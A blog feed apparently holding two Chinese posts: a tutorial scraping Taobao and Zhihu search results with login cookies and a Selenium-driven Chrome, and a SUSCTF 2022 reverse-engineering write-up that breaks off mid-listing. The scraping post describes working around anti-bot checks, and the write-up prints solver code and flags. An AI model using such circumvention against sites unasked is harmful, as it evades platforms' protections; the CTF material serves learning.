        <content type="html"><![CDATA[<p>记一次基本的爬虫。<a id="more"></a></p><h3 id="爬取淘宝搜索某商品出现的信息"><a href="#爬取淘宝搜索某商品出现的信息" class="headerlink" title="爬取淘宝搜索某商品出现的信息"></a>爬取淘宝搜索某商品出现的信息</h3><p>因为淘宝现在要登录才能进行商品搜索，所以我们先在网页上进行登录，然后获取相关的header与cookie，最后利用参数进行登录获取相关信息。</p><p>1、登录淘宝</p><p>2、随便搜索某一商品，打开网络资源，刷新一下找到search</p><p><img src="/2022/03/06/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%88%AC%E8%99%AB/image-20220308185109876.png" alt="image-20220308185109876"></p><p>3、右键，复制为cURL</p><p><img src="/2022/03/06/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%88%AC%E8%99%AB/image-20220308185221096.png" alt="image-20220308185221096"></p><p>4、在 <a href="https://curlconverter.com/" target="_blank" rel="noopener">https://curlconverter.com/</a> 将上一步复制的curl访问命令转化为python的请求方式。</p><p><img src="/2022/03/06/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%88%AC%E8%99%AB/image-20220308185444267.png" alt="image-20220308185444267"></p><p>5、复制出上一步转化得到的python请求代码，补充好相关请求和解析数据的代码即可。</p><p>完整代码：url中的s参数表示正在访问的页面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=GBK</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_html</span><span class="params">()</span>:</span></span><br><span class="line">    name = <span class="string">"休闲养生食品"</span></span><br><span class="line">    start_url = <span class="string">'https://s.taobao.com/search?q=&#123;&#125;&amp;s='</span>.format(name)</span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0'</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    cookies = &#123;<span class="string">''</span>&#125; <span class="comment">#登录后从网络资源中获取</span></span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0'</span>,</span><br><span class="line">        <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'</span>,</span><br><span class="line">        <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'</span>,</span><br><span class="line">        <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate, br'</span>,</span><br><span class="line">        <span class="string">'Connection'</span>: <span class="string">'keep-alive'</span>,</span><br><span class="line">        <span class="string">'Upgrade-Insecure-Requests'</span>: <span class="string">'1'</span>,</span><br><span class="line">        <span class="string">'Sec-Fetch-Dest'</span>: <span class="string">'document'</span>,</span><br><span class="line">        <span class="string">'Sec-Fetch-Mode'</span>: <span class="string">'navigate'</span>,</span><br><span class="line">        <span class="string">'Sec-Fetch-Site'</span>: <span class="string">'none'</span>,</span><br><span class="line">        <span class="string">'Sec-Fetch-User'</span>: <span class="string">'?1'</span>,</span><br><span class="line">        <span class="string">'Cache-Control'</span>: <span class="string">'max-age=0'</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pages = <span class="number">100</span></span><br><span class="line">    goods = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(int(pages)):</span><br><span class="line">        url = start_url + str(i*<span class="number">44</span>)</span><br><span class="line">        print(url)</span><br><span class="line">        r = requests.get(url, headers=headers, cookies=cookies, timeout=<span class="number">60</span>)</span><br><span class="line">        <span class="keyword">assert</span> r.status_code == <span class="number">200</span></span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        goods += r.text</span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        print(<span class="string">"爬取进度: %d%%"</span>%(((i+<span class="number">1</span>)/pages)*<span class="number">100</span>))</span><br><span class="line">        <span class="comment">#exit()</span></span><br><span class="line">    <span class="comment">#print(goods)</span></span><br><span class="line">    <span class="keyword">return</span> goods</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_ms</span><span class="params">(html)</span>:</span></span><br><span class="line">    titles = re.findall(<span class="string">'"raw_title":"(.*?)"'</span>, html)</span><br><span class="line">    pays = re.findall(<span class="string">'"view_sales":"(.*?)人付款"'</span>, html)</span><br><span class="line">    pays = [i.replace(<span class="string">'+'</span>, <span class="string">''</span>) <span class="keyword">for</span> i <span class="keyword">in</span> pays]</span><br><span class="line">    pays = [i.replace(<span class="string">'万'</span>, <span class="string">'0000'</span>) <span class="keyword">if</span> i.find(<span class="string">'万'</span>) != <span class="number">-1</span> <span class="keyword">else</span> i <span class="keyword">for</span> i <span class="keyword">in</span> pays]</span><br><span class="line">    <span class="comment">#print(pays)</span></span><br><span class="line">    data = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(titles)):</span><br><span class="line">        data.append([titles[i], pays[i]])</span><br><span class="line">    <span class="comment">#print(data)    </span></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_file</span><span class="params">(data)</span>:</span></span><br><span class="line">    path = <span class="string">'data_taobao.csv'</span></span><br><span class="line">    f = open(path, <span class="string">"w"</span>, newline=<span class="string">""</span>)</span><br><span class="line">    writer = csv.writer(f)</span><br><span class="line">    writer.writerow([<span class="string">'商品'</span>, <span class="string">'付款人数'</span>])</span><br><span class="line">    writer.writerows(data)</span><br><span class="line">    f.close()</span><br><span class="line">  </span><br><span class="line">goods = get_html()</span><br><span class="line">data = find_ms(goods)</span><br><span class="line">save_file(data)</span><br></pre></td></tr></table></figure><h3 id="爬取知乎中搜索相关话题的综合相关内容"><a href="#爬取知乎中搜索相关话题的综合相关内容" class="headerlink" title="爬取知乎中搜索相关话题的综合相关内容"></a>爬取知乎中搜索相关话题的综合相关内容</h3><p>如搜索朋克养生，要爬取的页面如下：</p><p><img src="/2022/03/06/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%88%AC%E8%99%AB/image-20220308190349236.png" alt="image-20220308190349236"></p><p>因为是第一次接触爬虫，以为简单的把页面数据请求下来使用正则匹配需要的内容就好了，但发现请求的内容根本没有页面展示出的相关内容，只有一个框架。</p><p>经过相关了解后，发现这是一个使用ajax异步加载的页面，也就是说我们需要的数据是在访问页面过程中动态加载的，我们在脚本中请求只能获得静态页面（由于requests模块是一个不完全模拟浏览器行为的模块，只能爬取到网页的HTML文档信息，无法解析和执行CSS、JavaScript代码），接着我从网络资源中的xhr页面中找到真正获取数据的接口：</p><p><img src="/2022/03/06/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%88%AC%E8%99%AB/image-20220308191152611.png" alt="image-20220308191152611"></p><p><img src="/2022/03/06/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%88%AC%E8%99%AB/image-20220308191259657.png" alt="image-20220308191259657"></p><p>但是直接请求这个接口服务端并不会正确返回，因为有相关字段（x-zse-93，x-zse-96，x-zse-81）进行校验，这也简单，其中x-zse-93与x-zse-81是固定的，我们只需要从js代码中逆向出x-zse-96的计算方法，爬取页面的时候模拟计算一下就好。而弄完，又遇到了其它的问题，访问接口的search_hash_id不止一种，这就使x-zse-96字段的值也不止一种，且相关处理也挺麻烦的，因此我使用了另外一种爬取方法：<strong>使用selenium接管本地打开的浏览器然后利用执行js代码对页面滚动条进行滑动，最后获取匹配我们需要的关键信息。（知乎对selenium进行了反爬处理，即对相关字符串进行了检查）</strong></p><p>1、本地以一个端口启动chorm</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chrome.exe <span class="attribute">--remote-debugging-port</span>=9222 <span class="attribute">--user-data-dir</span>=<span class="string">"./"</span></span><br></pre></td></tr></table></figure><p>2、使用selenium接管上一步打开的浏览器，访问要爬取页面的url</p><p>3、利用执行js代码的方式不断向下滑动滚动条加载数据，不断加大滚动条与顶部的距离</p><p><img src="/2022/03/06/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%88%AC%E8%99%AB/image-20220308194129986.png" alt="image-20220308194129986"></p><p>4、利用相关标签匹配所需要的数据并进行正则匹配</p><p>完整代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=gbk</span></span><br><span class="line"><span class="keyword">import</span> selenium.webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">match_data</span><span class="params">(driver, xpath, data)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> content <span class="keyword">in</span> driver.find_elements(by=By.XPATH, value=xpath):</span><br><span class="line">        tmp = []</span><br><span class="line">        tmp += [content.find_element(by=By.CLASS_NAME, value=<span class="string">"Highlight"</span>).text]</span><br><span class="line">        ans = list(re.findall(<span class="string">"赞同.?(.*?)\n([0-9]*).*\n(.*)"</span>, content.find_element(by=By.CLASS_NAME, value=<span class="string">"ContentItem-actions"</span>).text)[<span class="number">0</span>])</span><br><span class="line">        tmp += [<span class="string">'0'</span> <span class="keyword">if</span> i == <span class="string">''</span> <span class="keyword">else</span> i <span class="keyword">for</span> i <span class="keyword">in</span> ans]</span><br><span class="line">        data += [tmp]</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span><span class="params">(data)</span>:</span></span><br><span class="line">    name = <span class="string">"朋克养生"</span></span><br><span class="line">    url = <span class="string">'https://www.zhihu.com/search?q=&#123;&#125;&amp;utm_content=search_history&amp;type=content'</span>.format(name)</span><br><span class="line">    chrome_options = Options()</span><br><span class="line">    chrome_options.add_experimental_option(<span class="string">"debuggerAddress"</span>, <span class="string">"127.0.0.1:9222"</span>)</span><br><span class="line">    driver = selenium.webdriver.Chrome(options=chrome_options)</span><br><span class="line">    driver.get(url)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">        js = <span class="string">'var action=document.documentElement.scrollTop=&#123;&#125;'</span>.format(<span class="number">1000</span>+<span class="number">300</span>*i)</span><br><span class="line">        driver.execute_script(js)</span><br><span class="line">        print(<span class="string">"爬取进度: %d%%"</span>%(((<span class="number">1000</span>+<span class="number">300</span>*i)/(<span class="number">1000</span>+<span class="number">300</span>*<span class="number">99</span>))*<span class="number">100</span>))</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">    match_data(driver, <span class="string">"//div[@class='ContentItem AnswerItem']"</span>, data)</span><br><span class="line">    match_data(driver, <span class="string">"//div[@class='ContentItem ArticleItem']"</span>, data)   </span><br><span class="line">      </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_file</span><span class="params">(data)</span>:</span></span><br><span class="line">    path = <span class="string">'data_zhihu.csv'</span></span><br><span class="line">    f = open(path, <span class="string">"w"</span>, newline=<span class="string">""</span>)</span><br><span class="line">    writer = csv.writer(f)</span><br><span class="line">    writer.writerow([<span class="string">'问题'</span>, <span class="string">'点赞数'</span>, <span class="string">'评论数'</span>, <span class="string">'日期'</span>])</span><br><span class="line">    writer.writerows(data)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    data = []  </span><br><span class="line">    get_data(data)</span><br><span class="line">    article_num = len(data)</span><br><span class="line">    voteup_sum = sum([int(i[<span class="number">1</span>].replace(<span class="string">' 万'</span>, <span class="string">'0000'</span>)) <span class="keyword">if</span> <span class="string">'万'</span> <span class="keyword">in</span> i[<span class="number">1</span>] <span class="keyword">else</span> int(i[<span class="number">1</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> data])</span><br><span class="line">    comment_sum = sum([int(i[<span class="number">2</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> data])</span><br><span class="line">    print(<span class="string">"爬取完成，文章总数: %d, 点赞总数: %d, 评论总数: %d"</span>%(article_num, voteup_sum, comment_sum))</span><br><span class="line">    save_file(data)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 爬虫 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SUSCTF 2022部分逆向题解</title>
      <link href="/2022/03/02/SUSCTF-2022%E9%83%A8%E5%88%86%E9%80%86%E5%90%91%E9%A2%98%E8%A7%A3/"/>
      <url>/2022/03/02/SUSCTF-2022%E9%83%A8%E5%88%86%E9%80%86%E5%90%91%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>来记录一下 <a id="more"></a></p><h3 id="DigitalCircuits"><a href="#DigitalCircuits" class="headerlink" title="DigitalCircuits"></a>DigitalCircuits</h3><p>py文件打包的exe，使用pyinstxtractor解包，填充pyc头，最后使用uncompyle6反编译得到py代码。</p><p>如题目的名称，此程序中的加法，移位，异或运算都是作者自己从二进制的角度实现的。</p><p>加法：</p><p><img src="/2022/03/02/SUSCTF-2022%E9%83%A8%E5%88%86%E9%80%86%E5%90%91%E9%A2%98%E8%A7%A3/KsMobiRGAeN18zg.png" alt="image-20220228154125971"></p><p>逻辑右移：<br><img src="/2022/03/02/SUSCTF-2022%E9%83%A8%E5%88%86%E9%80%86%E5%90%91%E9%A2%98%E8%A7%A3/NDbjw6ZdIaxEH2M.png" alt="image-20220228154029768"></p><p>逻辑左移：<br><img src="/2022/03/02/SUSCTF-2022%E9%83%A8%E5%88%86%E9%80%86%E5%90%91%E9%A2%98%E8%A7%A3/EseZK4ljmy9aqWY.png" alt="image-20220228154056555"></p><p>异或：<br><img src="/2022/03/02/SUSCTF-2022%E9%83%A8%E5%88%86%E9%80%86%E5%90%91%E9%A2%98%E8%A7%A3/ejLOUZD4wymQTIv.png" alt="image-20220228154201894"></p><p>这样来看此程序就是很明显的tea加密了，只是用二进制运算来实现的。</p><p>tea解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tea_decode</span><span class="params">(enc, k)</span>:</span></span><br><span class="line">    v0 = enc[<span class="number">0</span>]</span><br><span class="line">    v1 = enc[<span class="number">1</span>]</span><br><span class="line">    sum = (delta*<span class="number">32</span>)&amp;<span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">        v1 -= ((v0&lt;&lt;<span class="number">4</span>) + k[<span class="number">2</span>]) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="number">5</span>) + k[<span class="number">3</span>])</span><br><span class="line">        v1 &amp;= <span class="number">0xffffffff</span></span><br><span class="line">        v0 -= ((v1&lt;&lt;<span class="number">4</span>) + k[<span class="number">0</span>]) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="number">5</span>) + k[<span class="number">1</span>])</span><br><span class="line">        v0 &amp;= <span class="number">0xffffffff</span></span><br><span class="line">        sum -= delta</span><br><span class="line">    <span class="keyword">return</span> (v0, v1)</span><br><span class="line"></span><br><span class="line">enc = <span class="string">'001111101000100101000111110010111100110010010100010001100011100100110001001101011000001110001000001110110000101101101000100100111101101001100010011100110110000100111011001011100110010000100111'</span></span><br><span class="line">enc = [int(enc[i:i+<span class="number">32</span>], <span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(enc), <span class="number">32</span>)]</span><br><span class="line"></span><br><span class="line">k = [<span class="number">0</span>]*<span class="number">4</span></span><br><span class="line">k[<span class="number">0</span>] = int(<span class="string">'0100010001000101'</span>.zfill(<span class="number">32</span>), <span class="number">2</span>)</span><br><span class="line">k[<span class="number">1</span>] = int(<span class="string">'0100000101000100'</span>.zfill(<span class="number">32</span>), <span class="number">2</span>)</span><br><span class="line">k[<span class="number">2</span>] = int(<span class="string">'0100001001000101'</span>.zfill(<span class="number">32</span>), <span class="number">2</span>)</span><br><span class="line">k[<span class="number">3</span>] = int(<span class="string">'0100010101000110'</span>.zfill(<span class="number">32</span>), <span class="number">2</span>)</span><br><span class="line">delta = int(<span class="string">'10011110001101110111100110111001'</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(enc), <span class="number">2</span>):</span><br><span class="line">    ans = tea_decode(enc[i:i+<span class="number">2</span>], k)</span><br><span class="line">    flag += ans[<span class="number">0</span>].to_bytes(<span class="number">4</span>, <span class="string">'big'</span>)+ans[<span class="number">1</span>].to_bytes(<span class="number">4</span>, <span class="string">'big'</span>)</span><br><span class="line">     </span><br><span class="line">print(<span class="string">b'SUSCTF&#123;'</span>+flag+<span class="string">b'&#125;'</span>)</span><br></pre></td></tr></table></figure><h3 id="hell-world"><a href="#hell-world" class="headerlink" title="hell_world"></a>hell_world</h3><p>字符串定位关键函数，从case7能推出输入长度及case9是加密操作。</p><p><img src="/2022/03/02/SUSCTF-2022%E9%83%A8%E5%88%86%E9%80%86%E5%90%91%E9%A2%98%E8%A7%A3/K5D6C9ZVwkruNbJ.png" alt="image-20220228160432623"></p><p>其中case9是将输入转化为二进制，只是0和1使用2和3来替换，接着执行的case10是使用硬编码的数组数据与输入进行异或操作且转化为二进制。</p><p><img src="/2022/03/02/SUSCTF-2022%E9%83%A8%E5%88%86%E9%80%86%E5%90%91%E9%A2%98%E8%A7%A3/vjFa2r8IkGynH1C.png" alt="image-20220228161525085"></p><p>再来看到紧接着case10执行的case11，关键就是比较操作，密文在dword_7FF759245B80数组。</p><p><img src="/2022/03/02/SUSCTF-2022%E9%83%A8%E5%88%86%E9%80%86%E5%90%91%E9%A2%98%E8%A7%A3/bg1UxEp3m8dWt67.png" alt="image-20220228161753597"></p><p>所以说，使用两个数组异或就解密了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>enc</span><br><span class="line">[<span class="number">5</span>, <span class="number">143</span>, <span class="number">158</span>, <span class="number">121</span>, <span class="number">42</span>, <span class="number">192</span>, <span class="number">104</span>, <span class="number">129</span>, <span class="number">45</span>, <span class="number">252</span>, <span class="number">207</span>, <span class="number">164</span>, <span class="number">181</span>, <span class="number">85</span>, <span class="number">95</span>, <span class="number">228</span>, <span class="number">157</span>, <span class="number">35</span>, <span class="number">214</span>, <span class="number">29</span>, <span class="number">241</span>, <span class="number">231</span>, <span class="number">151</span>, <span class="number">145</span>, <span class="number">6</span>, <span class="number">36</span>, <span class="number">66</span>, <span class="number">113</span>, <span class="number">60</span>, <span class="number">88</span>, <span class="number">92</span>, <span class="number">48</span>, <span class="number">25</span>, <span class="number">198</span>, <span class="number">245</span>, <span class="number">188</span>, <span class="number">75</span>, <span class="number">66</span>, <span class="number">93</span>, <span class="number">218</span>, <span class="number">88</span>, <span class="number">155</span>, <span class="number">36</span>, <span class="number">64</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>x</span><br><span class="line">[<span class="number">86</span>, <span class="number">218</span>, <span class="number">205</span>, <span class="number">58</span>, <span class="number">126</span>, <span class="number">134</span>, <span class="number">19</span>, <span class="number">181</span>, <span class="number">29</span>, <span class="number">157</span>, <span class="number">252</span>, <span class="number">151</span>, <span class="number">140</span>, <span class="number">49</span>, <span class="number">107</span>, <span class="number">201</span>, <span class="number">251</span>, <span class="number">26</span>, <span class="number">226</span>, <span class="number">45</span>, <span class="number">220</span>, <span class="number">211</span>, <span class="number">241</span>, <span class="number">244</span>, <span class="number">54</span>, <span class="number">9</span>, <span class="number">32</span>, <span class="number">66</span>, <span class="number">4</span>, <span class="number">106</span>, <span class="number">113</span>, <span class="number">83</span>, <span class="number">120</span>, <span class="number">164</span>, <span class="number">151</span>, <span class="number">143</span>, <span class="number">122</span>, <span class="number">114</span>, <span class="number">57</span>, <span class="number">232</span>, <span class="number">61</span>, <span class="number">250</span>, <span class="number">64</span>, <span class="number">61</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flag = [enc[i]^x[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc))]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bytes(flag)</span><br><span class="line"><span class="string">b'SUSCTF&#123;40a339d4-f940-4fe0-b382-cabb310d2ead&#125;'</span></span><br></pre></td></tr></table></figure><h3 id="tttree"><a href="#tttree" class="headerlink" title="tttree"></a>tttree</h3><p>程序中的几种花指令：</p><p>1、</p><p><img src="/2022/03/02/SUSCTF-2022%E9%83%A8%E5%88%86%E9%80%86%E5%90%91%E9%A2%98%E8%A7%A3/8Cn7UOrxFvPZKRd.png" alt="image-20220228165327363"></p><p>2、</p><p><img src="/2022/03/02/SUSCTF-2022%E9%83%A8%E5%88%86%E9%80%86%E5%90%91%E9%A2%98%E8%A7%A3/dZNHEWM86K3Qxrl.png" alt="image-20220228171125684"></p><p>开始想的是把所有汇编代码复制到文本中，用python来提取计算出要跳转的地址，然后记录出要替换的地址及要替换成的汇编代码，最后批量patch一下，但是在做的时候对第二种花指令没有考虑前面的push操作，所以最后弄完没啥效果，就干脆不去除了。</p><p>从最后判断入手，有5个error的字符串，因为我将大部分的花指令都正确替换成了对应的jmp，所以从字符串error就能找到对应的被调用地址，调试定位到其中有2个是check输入长度和格式不对时要输出的error。</p><p><img src="/2022/03/02/SUSCTF-2022%E9%83%A8%E5%88%86%E9%80%86%E5%90%91%E9%A2%98%E8%A7%A3/19sIPfeycpjzBmu.png" alt="image-20220228173239435"></p><p>其次另外3个error是最后的checK加密结果的，不断向上回溯看汇编可以发现最后的check中循环用到了dword_1400073C0这个数组。</p><p><img src="/2022/03/02/SUSCTF-2022%E9%83%A8%E5%88%86%E9%80%86%E5%90%91%E9%A2%98%E8%A7%A3/oTbVuQwHG8ljmvr.png" alt="image-20220228173416091"></p><p>重新打开一个未patch过的程序，在引用了dword_1400073C0数组对应的地址下断点，运行看对应的内存。<br><img src="/2022/03/02/SUSCTF-2022%E9%83%A8%E5%88%86%E9%80%86%E5%90%91%E9%A2%98%E8%A7%A3/CDPhBMFweRI7Qsj.png" alt="image-20220228174506800"></p><p>另外从其对这个数组的访问下标看到都是乘以了28，因此可以知道这个数据是28个字节为一组，7个4字节变量。</p><p><img src="/2022/03/02/SUSCTF-2022%E9%83%A8%E5%88%86%E9%80%86%E5%90%91%E9%A2%98%E8%A7%A3/pXG6N1kD3Psf5RJ.png" alt="image-20220228174739680"></p><p>观察这个内存数据，可以发现每组的最后一个4字节变量正好对应我们的输入且在这个数组中的存放顺序就是我们输入顺序，idapython导出数据便于观察。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ida_bytes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567'</span></span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x1400073C0</span>+<span class="number">7</span>*<span class="number">4</span></span><br><span class="line">ans = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    ans += [[s[i], get_dword(addr), get_dword(addr+<span class="number">4</span>), get_dword(addr+<span class="number">12</span>)]]</span><br><span class="line">    addr += <span class="number">7</span>*<span class="number">4</span></span><br><span class="line">    </span><br><span class="line">print(ans)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[[<span class="string">'A'</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">5</span>], [<span class="string">'B'</span>, <span class="number">15</span>, <span class="number">18</span>, <span class="number">17</span>], [<span class="string">'C'</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>], [<span class="string">'D'</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">2</span>], [<span class="string">'E'</span>, <span class="number">4</span>, <span class="number">21</span>, <span class="number">32</span>], [<span class="string">'F'</span>, <span class="number">0</span>, <span class="number">26</span>, <span class="number">3</span>], [<span class="string">'G'</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>], [<span class="string">'H'</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">4</span>], [<span class="string">'I'</span>, <span class="number">28</span>, <span class="number">1</span>, <span class="number">7</span>], [<span class="string">'J'</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>], [<span class="string">'K'</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>], [<span class="string">'L'</span>, <span class="number">22</span>, <span class="number">0</span>, <span class="number">3</span>], [<span class="string">'M'</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>], [<span class="string">'N'</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">4</span>], [<span class="string">'O'</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">9</span>], [<span class="string">'P'</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">3</span>], [<span class="string">'Q'</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>], [<span class="string">'R'</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">7</span>], [<span class="string">'S'</span>, <span class="number">16</span>, <span class="number">0</span>, <span class="number">4</span>], [<span class="string">'T'</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>], [<span class="string">'U'</span>, <span 